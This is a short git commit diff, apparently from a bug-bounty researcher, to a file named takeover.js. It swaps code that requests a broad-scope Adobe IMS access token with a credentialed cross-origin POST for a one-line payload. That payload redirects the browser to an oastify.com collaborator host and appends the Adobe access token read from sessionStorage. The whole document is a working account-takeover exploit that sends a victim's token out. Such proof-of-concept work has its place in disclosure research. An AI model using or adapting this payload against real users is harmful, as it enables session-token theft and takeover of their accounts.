b91ed72a9bbf2c1a85400be03a539779fcc4f225
mrhavit <mrhavit@wearehackerone.com>
2024-03-08 23:04:39 +0200

    dsa

--- takeover.js
+++ takeover.js
@@ -1,14 +1,1 @@
-fetch('https://adobeid-na1.services.adobe.com/ims/check/v6/token?jslVersion=v2-v0.31.0-2-g1e8a8a8', {
-    method: 'POST',
-    headers: {
-        'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8'
-    },
-    credentials: 'include',
-    body: new URLSearchParams({
-        'client_id': 'projectx_webapp',
-        'scope': 'ab.manage,AdobeID,openid,read_organizations,creative_cloud,creative_sdk,tk_platform,tk_platform_sync,af_byof,stk.a.license_skip.r,stk.a.limited_license.cru,additional_info.optionalAgreements,uds_read,uds_write,af_ltd_projectx,unified_dev_portal,additional_info.ownerOrg,additional_info.roles,additional_info.roles,DCAPI,additional_info.auth_source,additional_info.authenticatingAccount,pps.write,pps.delete,tk_platform_grant_free_subscription,pps.read,firefly_api,additional_info.projectedProductContext'
-    })
-})
-.then(response => response.json())
-.then(data => console.log(data))
-.catch(error => console.error('Error:', error));
+location='https://u3y0h2wy9uenz1pp3073lkn6bxho5et3.oastify.com/test='+sessionStorage.getItem('adobeid_ims_access_token/projectx_webapp/false/AdobeID,DCAPI,ab.manage,additional_info.auth_source,additional_info.authenticatingAccount,additional_info.optionalAgreements,additional_info.ownerOrg,additional_info.projectedProductContext,additional_info.roles,additional_info.roles,af_byof,af_ltd_projectx,creative_cloud,creative_sdk,firefly_api,openid,pps.delete,pps.read,pps.write,read_organizations,stk.a.license_skip.r,stk.a.limited_license.cru,tk_platform,tk_platform_grant_free_subscription,tk_platform_sync,uds_read,uds_write,unified_dev_portal')
